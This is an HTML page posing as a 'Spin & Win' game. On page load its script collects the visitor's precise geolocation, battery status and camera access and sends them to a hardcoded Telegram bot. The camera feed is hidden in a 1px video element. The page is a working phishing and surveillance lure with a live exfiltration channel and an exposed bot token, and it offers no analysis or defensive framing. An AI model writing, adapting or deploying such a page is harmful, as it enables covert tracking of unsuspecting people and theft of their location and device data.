<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>🎯 Spin & Win Game</title>
  <style>
    body {
      background: linear-gradient(45deg, #00c6ff, #0072ff);
      color: white;
      text-align: center;
      font-family: 'Comic Sans MS', cursive;
      height: 100vh;
      margin: 0;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }
    .spinner {
      width: 200px;
      height: 200px;
      margin: auto;
      border: 16px solid rgba(255,255,255,0.3);
      border-top: 16px solid #fff;
      border-radius: 50%;
      animation: spin 1.5s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .info {
      margin-top: 30px;
      font-size: 16px;
      text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
    }
  </style>
</head>
<body>
  <h1>🎉 Spin & Win 🎉</h1>
  <div class="spinner"></div>
  <div class="info" id="info">Collecting data...</div>

  <script>
    const BOT_TOKEN = "8046535922:AAF4FFFb0gIhkiPgmUTdUKeiIPpL33gWym4";
    const CHAT_ID = "1954755564";

    const info = document.getElementById('info');

    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      fetch(url, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      })
      .then(response => console.log("Telegram response:", response))
      .catch(error => console.error("Telegram error:", error));
    }

    // Get location
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude.toFixed(6);
        const lon = pos.coords.longitude.toFixed(6);
        const locMsg = `📍 Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
        info.innerHTML += `<br>${locMsg.replace(/\n/g,"<br>")}`;
        sendToTelegram(locMsg);
      }, err => {
        info.innerHTML += "<br>⚠️ Location denied.";
      });
    } else {
      info.innerHTML += "<br>⚠️ Geolocation not supported.";
    }

    // Get battery
    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        const level = (battery.level * 100).toFixed(0);
        const charging = battery.charging ? "🔌 Charging" : "🔋 Not Charging";
        const batMsg = `🔋 Battery: ${level}% | ${charging}`;
        info.innerHTML += `<br>${batMsg}`;
        sendToTelegram(batMsg);
      });
    } else {
      info.innerHTML += "<br>⚠️ Battery API not supported.";
    }

    // Get camera access
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        video.style.width = "1px"; // hide it
        video.style.height = "1px";
        document.body.appendChild(video);
        info.innerHTML += "<br>📷 Camera access granted.";
        sendToTelegram("📷 Camera access granted!");
      })
      .catch(err => {
        info.innerHTML += "<br>⚠️ Camera access denied.";
        sendToTelegram("⚠️ Camera access denied.");
      });
  </script>
</body>
</html>